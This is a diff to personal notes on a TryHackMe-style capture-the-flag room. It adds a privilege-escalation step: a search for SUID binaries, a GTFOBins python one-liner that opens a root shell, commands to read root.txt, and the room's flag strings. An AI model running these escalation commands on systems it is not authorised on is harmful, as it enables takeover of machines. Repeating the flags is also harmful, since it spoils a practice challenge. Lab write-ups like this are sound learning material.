@@ -24,3 +24,12 @@ Discovered info:
      - `find / -type f -name user.txt 2> /dev/null`
      - /var/www/user.txt < is the path to the file we are looking for, and inside it is the flag
      - THM{y0u_g0t_a_sh3ll}
+
+5. Privelege escalation
+   - find for files/packages that have loose permissions
+      - `find / -type f -user root -perm -4000 2> /dev/null`
+   - got to gtfobins to find ways to use the tools you found(in this case, python)
+      - command i found > `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+      - find root.txt > `find / -type f -name root.txt 2> /dev/null`
+         - `cat /root/root.txt
+         - THM{pr1v1l3g3_3sc4l4t10n}
